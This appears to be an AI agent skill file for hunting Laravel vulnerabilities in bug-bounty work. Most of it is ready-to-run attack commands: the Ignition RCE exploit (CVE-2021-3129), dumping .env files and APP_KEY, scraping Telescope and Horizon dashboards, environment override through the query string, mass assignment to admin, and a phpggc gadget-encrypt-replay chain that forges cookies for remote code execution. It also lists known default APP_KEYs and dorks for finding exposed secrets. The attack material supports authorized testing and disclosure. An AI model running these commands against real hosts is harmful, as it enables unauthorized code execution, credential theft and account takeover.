# Upstream source: laravel (hunting)

Original path: `/tmp/h1res_MrPsycho04_Hunting-Agent/laravel/SKILL.md`

---

---
name: laravel
description: Hunt Laravel specific vulnerabilities — Debug mode leakage (APP_DEBUG=true exposes full stack trace + env vars), Laravel Telescope/Horizon dashboard unauthorized access, Ignition RCE (CVE-2021-3129), Signed URL manipulation, Queue Worker abuse, mass assignment via Eloquent, deserialization via cookies, .env file exposure. Use when target runs Laravel (PHP) — detected via X-Powered-By, Laravel session cookies, or /storage/ paths.
---

# HUNT-LARAVEL — Laravel Specific Vulnerabilities

## Crown Jewel Targets

Laravel debug mode enabled in production = instant RCE via Ignition (CVE-2021-3129).

**Highest-value findings:**
- **Ignition RCE (CVE-2021-3129)** — `APP_DEBUG=true` + Laravel < 8.4.2 → `/_ignition/execute-solution` RCE without auth
- **Telescope dashboard** — `/telescope` exposes full request/response logs, DB queries, Redis commands, scheduled jobs, environment variables
- **Horizon dashboard** — `/horizon` exposes queue job details, failed jobs with full payloads (may contain API keys, PII)
- **Signed URL manipulation** — if `URL::signedRoute` validates wrong params → bypass signed URL → unauthorized actions
- **.env exposure** — `APP_KEY` leaked → decrypt all encrypted cookies → forge session → ATO

---

## Phase 1 — Fingerprint Laravel

```bash
# Laravel-specific indicators
curl -sI https://$TARGET/ | grep -i "laravel_session\|x-powered-by.*php"
curl -s https://$TARGET/ | grep -i "laravel\|Illuminate\|csrf-token"

# Common Laravel paths
for path in /storage /public /resources "/vendor/laravel" "/.env" "/artisan"; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://$TARGET$path")
  [ "$STATUS" != "404" ] && echo "$path: $STATUS"
done

# Check error page (trigger 404)
curl -s "https://$TARGET/definitely-does-not-exist-xyz" | grep -i "laravel\|Whoops\|Ignition\|symfony"
```

---

## Phase 2 — Debug Mode & Ignition RCE (CVE-2021-3129)

```bash
# Step 1: Check if debug mode is enabled (Whoops error page)
curl -s "https://$TARGET/nonexistent" | grep -i "Whoops\|APP_DEBUG\|Ignition"

# If Whoops/Ignition is visible → debug mode ON → test CVE-2021-3129

# Step 2: Check Ignition endpoint
curl -s "https://$TARGET/_ignition/health-check" | head -5

# Step 3: CVE-2021-3129 — Laravel < 8.4.2 RCE via log file manipulation
# (Requires debug mode + writable storage/logs)
# Tool: ambionics/laravel-ignition-rce
git clone https://github.com/ambionics/laravel-ignition-rce /tmp/laravel-rce
php /tmp/laravel-rce/exploit.php https://$TARGET "id"

# Manual test — send solution request
curl -s -X POST "https://$TARGET/_ignition/execute-solution" \
  -H "Content-Type: application/json" \
  -d '{
    "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
    "parameters": {
      "variableName": "x",
      "viewFile": "php://filter/write=convert.base64-decode/resource=../storage/logs/laravel.log"
    }
  }'
```

---

## Phase 3 — Laravel Telescope & Horizon

```bash
# Telescope — request/response logs, DB queries, jobs, cache, events
curl -s "https://$TARGET/telescope" | grep -i "telescope\|laravel"
curl -s "https://$TARGET/telescope/api/requests" | python3 -m json.tool 2>/dev/null | head -50
curl -s "https://$TARGET/telescope/api/commands" | python3 -m json.tool 2>/dev/null | head -30
curl -s "https://$TARGET/telescope/api/redis" | python3 -m json.tool 2>/dev/null | head -30
curl -s "https://$TARGET/telescope/api/environment" | python3 -m json.tool 2>/dev/null | head -50

# Horizon — queue worker dashboard
curl -s "https://$TARGET/horizon" | grep -i "horizon\|laravel"
curl -s "https://$TARGET/horizon/api/stats" | python3 -m json.tool 2>/dev/null
curl -s "https://$TARGET/horizon/api/jobs/failed" | python3 -m json.tool 2>/dev/null | head -50
# Failed job payloads often contain full request data including auth tokens

# Common paths
for path in /telescope /telescope/requests /telescope/api /horizon /horizon/api/stats; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://$TARGET$path")
  [ "$STATUS" = "200" ] && echo "[+] ACCESSIBLE: $TARGET$path"
done
```

---

## Phase 4 — .env File & APP_KEY Exposure

```bash
# Direct .env access
curl -s "https://$TARGET/.env" | grep -i "APP_KEY\|DB_PASSWORD\|SECRET\|KEY"
curl -s "https://$TARGET/.env.production"
curl -s "https://$TARGET/.env.backup"
curl -s "https://$TARGET/.env.local"

# If APP_KEY found:
APP_KEY="base64:XXXXXXX"
echo "APP_KEY=$APP_KEY"
# → Can decrypt all Laravel encrypted cookies
# → Can forge session cookies → ATO for any user

# Also check
curl -s "https://$TARGET/storage/logs/laravel.log" | tail -100 | grep -i "exception\|error\|key\|password"
```

---

## Phase 4b — Environment override via query args (CVE-2024-52301)
When `register_argc_argv=On` (php.ini), Laravel parses the query-string as CLI args, so `?--env=` overrides `APP_ENV` over HTTP -> flip the app into `local`/`testing` config (debug on, seeded creds, weaker guards).
```bash
curl -s "https://$TARGET/?--env=local"          # force debug/local config
curl -s "https://$TARGET/login?--env=testing"    # swap to testing DB/config
# Confirm: debug/Whoops page or a different env banner. Fixed 11.31.0 / 10.48.23 / 9.52.17.
```

## Phase 5 — Signed URL Manipulation

```bash
# Laravel signed URLs contain signature param: ?signature=HASH
# Find signed URL endpoints
cat recon/$TARGET/urls.txt | grep "signature="

# Test: modify a non-signature parameter — should fail validation
SIGNED_URL="https://$TARGET/unsubscribe?user=123&email=test@test.com&signature=VALID_SIG"

# Modify user ID → should fail if properly signed
curl -s "${SIGNED_URL/user=123/user=999}"

# Test signature bypass: remove signature entirely
curl -s "${SIGNED_URL/&signature=VALID_SIG/}"

# Test: does the app validate ALL parameters or just some?
curl -s "${SIGNED_URL}&extra=malicious"
```

---

## Phase 6 — Mass Assignment via Eloquent

```bash
# Laravel Eloquent ORM — if model uses $guarded=[] or $fillable=[] improperly
# Test: add extra fields to update/create requests

# Profile update
curl -s -X POST "https://$TARGET/api/profile" \
  -H "Cookie: laravel_session=SESSION" \
  -H "Content-Type: application/json" \
  -d '{"name": "Test", "email": "test@test.com", "is_admin": true, "role": "admin"}'

# Registration
curl -s -X POST "https://$TARGET/api/register" \
  -H "Content-Type: application/json" \
  -d '{"name": "Test", "email": "test@new.com", "password": "test123", "verified": true, "admin": 1}'
```

---

## Phase 7 — Laravel Cookie Deserialization

```bash
# If APP_KEY is known, forge a session cookie with malicious serialized payload
# Uses phpggc gadget chains

# Get the app key
APP_KEY=$(curl -s "https://$TARGET/.env" | grep "^APP_KEY=" | cut -d= -f2)

# Generate payload with phpggc
php phpggc Laravel/RCE5 system 'id' | base64

# Sign the cookie with the app key using laravel-cookie-forge script
# python3 laravel_cookie_forge.py --key "$APP_KEY" --payload "PHPGGC_PAYLOAD"
```

---

## Chain Table

| Laravel finding | Chain to | Impact |
|----------------|----------|--------|
| Debug mode ON | CVE-2021-3129 Ignition RCE | Critical RCE |
| Telescope accessible | Read API keys, DB queries, env vars | High - credential theft |
| Horizon accessible | Read failed job payloads | High - PII/token exfil |
| .env exposed with APP_KEY | Forge session cookie → ATO | Critical ATO |
| Signed URL bypass | Unauthorized actions (unsubscribe any user, etc.) | Medium-High |
| Mass assignment | Set is_admin=true → privilege escalation | Critical |

---

## Validation

✅ Ignition RCE: `id` command output returned in response
✅ Telescope: API responses contain DB queries with credentials or user tokens
✅ APP_KEY: Forged session cookie accepted, returns another user's profile
✅ Mass assignment: `is_admin: true` accepted, account now has admin privileges

**Severity:**
- Ignition RCE: Critical
- Telescope/Horizon with sensitive data: High
- .env with APP_KEY: Critical
- Mass assignment to admin: Critical

---

## Web-Research Methodology Additions (2026)

### A. Discovery checklist — concrete fingerprints, endpoints, headers, CVEs to look for

- **APP_KEY reuse is the dominant 2024–2026 pattern.** Synacktiv + GitGuardian (July 2025) harvested **267,952 APP_KEYs** from public sources and **625,059 `XSRF-TOKEN` ciphers** from 672,481 public Laravel sites; ~**3.56%** of keys could be recovered without ever touching the target, and ~1,091 hosts were still one request away from CVE-2018-15133 RCE. Top reused keys are vendor defaults (UltimatePOS, XPanel, Invoice Ninja `RR++yx2rJ9kdxbdh3+AmbHLDQu+Q76i++co9Y8ybbno=`, Snipe-IT `3ilviXqB9u6DX1NRcyWGJ+sjySF+H18CPDGb3+IVwMQ=`, the legacy `SomeRandomString` / `SomeRandomStringOf32CharsExactly` defaults). Hash any discovered key against these corpora first.
- **The cookie pair is a free ciphertext oracle.** A default Laravel install always sets `XSRF-TOKEN` (immutable name) and `<app>_session` (e.g. `laravel_session`) on its first non-redirect response, even unauthenticated. Each value is a base64 JSON blob `{iv, value, mac, tag}` — that is a valid `Encrypter` cipher you can feed to an offline key brute-forcer. A decrypted plaintext starting with `s:`/`a:`/`O:` means deserialization is reachable.
- **Specific CVE-bearing products to fingerprint:**
  - **CVE-2024-55555 — Invoice Ninja** (pre-auth `GET /route/{hash}` calls `decrypt($hash)`); default key shipped in `.env.example`.
  - **CVE-2024-48987 — Snipe-IT** (`XSRF-TOKEN` decrypted + unserialized when `Passport::withCookieSerialization()` is set).
  - **CVE-2024-55556 — Crater** (`SESSION_DRIVER=cookie`, 40-char cookie name, e.g. `DqNfdAQoevsVc3L2TmqIttblIQGIJPVdLrwoY7xT`).
  - **CVE-2018-15133** — the original `XSRF-TOKEN` → `decrypt()` → RCE primitive; Androxgh0st (CISA AA24-016A) mass-scans `.env` for its key.
  - **CVE-2025-34060** — Monero-project Laravel forum `/get/image/?link=` passes user input to `file_get_contents()` with MIME checks bypassable via stream-filter chains → read `config/app.php` → APP_KEY → unserialize RCE (CVSS 10).
  - **CVE-2026-61701** — Laravel MagicLink deserialization RCE (2026 advisory).
  - **CVE-2024-52301** — query-string environment override when `register_argc_argv=On`; fixed in 11.31.0 / 10.48.23 / 9.52.17 (and 8.83.28 / 7.30.7 / 6.20.45). Probe `?--env=local`, `?--env=testing`.
  - **CVE-2021-3129** — Ignition `APP_DEBUG=true` + Laravel < 8.4.2 → `/_ignition/execute-solution` RCE (tool: `ambionics/laravel-ignition-rce`).
- **Secret-hunt surfaces:** `.env`, `.env.backup`, `.env.production`, `/storage/logs/laravel.log`, `/.git/config`, GitHub/CodeCanyon default configs, and Censys/Shodan `XSRF-TOKEN` dorks (`ext:env intext:APP_KEY=`, `github-dorks -q "APP_KEY=base64" -p php`).
- **Dashboard surfaces:** `/telescope`, `/telescope/api/requests|commands|redis|environment`, `/horizon`, `/horizon/api/stats`, `/horizon/api/jobs/failed` — failed job payloads routinely contain tokens/PII. Telescope's `/telescope/api/environment` is the single highest-value endpoint when accidentally public (full env dump).
- **Encrypter internals worth remembering for triage:** `encrypt()` produces AES-256-CBC over `serialize($value)` plus an HMAC in `mac`; GCM mode leaves `mac` empty and uses `tag`. `decrypt($payload, $unserialize = true)` defaults to `unserialize()` — that default is the root of every RCE chain in this class. A JSON blob with `"tag": null` or `"tag": ""` tells you which cipher path to attack with your tooling.
- **Reuse heuristics from the 2025 top-10 dataset:** an APP_KEY shared by >100 internet hosts is almost certainly a product default; if the target also exposes that product's distinctive cookie name or route (`/route/{hash}`, a 40-char session cookie), you can jump straight to its known CVE rather than brute-forcing.
- **Web-framework fingerprint sanity check:** Laravel session cookies are `httponly; samesite=lax` and `XSRF-TOKEN` is NOT httponly; if you see these attributes but no `laravel_session`, the app may use a custom `SESSION_COOKIE` name — derive it from the `Set-Cookie` list, not from a hardcoded wordlist.

### B. Techniques & bypasses — specific actionable techniques/payload shapes

- **Turn any single default install into a fleet RCE.** Collect the `XSRF-TOKEN` cipher from the target, run `laravel_crypto_killer.py bruteforce -v <cipher>` against a wordlist of known public/default APP_KEYs, then `decrypt -k <key> -v <cipher>` to confirm plaintext. A matched key on a second host proves the reused-secret class across the estate.
- **Gadget → encrypt → replay** (the full Synacktiv chain):
```
php8.2 phpggc Laravel/RCE13 system id -b -f
./laravel_crypto_killer.py encrypt -k <APP_KEY> -v "$(phpggc ...)"
curl -s http://TARGET/route/<ciphertext>            # Invoice Ninja
curl -s -H "Cookie: XSRF-TOKEN=<ciphertext>" http://TARGET/login   # Snipe-IT
```
- **Cookie-session variant (Crater):** decrypt the random-name session cookie; it decodes to `<hash>|<JSON>` where the JSON `data` field holds PHP serialized data. Pass the pre-pipe hash to `laravel_crypto_killer.py encrypt ... -sc <hash>` so the forged cookie preserves the session binding, then send it together with `laravel_session`.
- **phpggc chain choice matters by PHP/Laravel version:** `Laravel/RCE9` (PHP 7.4, Snipe-IT), `Laravel/RCE13` (PHP 8.2, Invoice Ninja), `Laravel/RCE15` (session-cookie QUEUE chain). Use `test-gc-compatibility.py` from phpggc to confirm the gadget still lands on the target's installed versions — Laravel ships many working chains even in current releases.
- **No-key paths:** if key recovery fails, go for `APP_DEBUG=true` (Whoops/Ignition) → CVE-2021-3129, or CVE-2025-34060-style stream-filter PHP wrappers (`php://filter/...`) to read `config/app.php`, or `?--env=local` (CVE-2024-52301) to flip into a debug/seeded config. Each can hand you the APP_KEY that unlocks the cookie chain.
- **Mass-assignment / signed-URL primitives from the baseline still apply** and chain well: `is_admin:true` on `/api/profile` or `/api/register`, and mutating non-signature parameters of a `?signature=` URL (remove signature, add `extra=`, change `user=`) to test whether all parameters are covered.
- **Ignition debug-mode details:** after `GET /_ignition/health-check` confirms the endpoint, the public exploit writes a base64-decoded payload into `../storage/logs/laravel.log` via `makeViewVariableOptionalSolution`, then includes the log through a crafted `viewFile` path. Two conditions must both hold — `APP_DEBUG=true` AND writable `storage/logs` — so a bare debug page with a read-only log dir may not be exploitable.
- **Key-generation hygiene note:** `php artisan key:generate` on install breaks the entire default-key class; a target whose `.env.example` still contains a real key is the vulnerable configuration. In reports, recommend removing APP_KEY from distributed products and forcing generation at install time (Synacktiv's primary recommendation).

### C. Validation / proof bar — how to confirm and avoid false positives

- **Decryption is not exploitation.** Report "APP_KEY recovered and valid" only when you also show a decrypted cookie whose plaintext contains serialized data (`s:`/`a:`/`O:`) *and* a deserialization sink you can reach. Synacktiv's research explicitly notes the decrypt function is safe if the caller passes `$unserialize=false` or the app has no reachable gadget.
- **Proof of RCE = command output or OOB callback**: `uid=... gid=...` in the response body (as in the published Invoice Ninja / Crater PoCs), a DNS/HTTP hit on a unique Collaborator subdomain, or a file written to a known web-accessible path. A 200 response alone is not proof.
- **Default-key caveat:** if the target ships a known default key but the app has been patched so the vulnerable `decrypt()` call site no longer exists (CVE-2024-48987/55555/55556 are all patched), the key alone is an info-leak/config finding, not RCE. Verify the specific vulnerable route/cookie behavior on the target.
- **Brute-force hygiene:** a "cracked key" that decrypts to a plain string with no serialized marker is a valid key but **not** an RCE path — record it as credential exposure and keep hunting for a sink. `nounours` classifies each result as CBC/GCM and flags whether a serialization pattern matched; use that flag, not the key hit, as the severity driver.
- **Environment-override CVE-2024-52301:** a changed banner or Whoops page after `?--env=local` confirms env manipulation, but severity depends on what the alternate config exposes (debug, seeded creds, weaker guards). Show the concrete delta — do not grade as RCE without a follow-on sink.
- **Redact** the APP_KEY, all cookie values, and any other-user PII in evidence; include only a key fingerprint plus the decrypted structure (per `evidence-hygiene`).
- **Reproduction checklist:** include the exact `Set-Cookie` header (redacted), the `laravel_crypto_killer.py decrypt -k ... -v ...` output showing serialized plaintext, the exact phpggc chain name, the re-encrypt command, and the final HTTP request with the forged cookie. A triager must be able to go from cookie → key → gadget → `id` output without guessing any step.
- **Scope discipline:** bulk internet-wide key cracking is research, not an authorized test of every matched host. Within a single engagement, restrict exploitation to in-scope assets; use out-of-scope matches only as evidence that the key is publicly known (Synacktiv's methodology), not as a finding.

### D. Sources — numbered list of URLs you actually fetched

1. https://www.synacktiv.com/en/publications/laravel-appkey-leakage-analysis
2. https://blog.gitguardian.com/exploiting-public-app_key-leaks/
3. https://nvd.nist.gov/vuln/detail/cve-2024-52301
4. https://nvd.nist.gov/vuln/detail/cve-2021-3129
5. https://github.com/synacktiv/laravel-crypto-killer
6. https://github.com/ambionics/phpggc
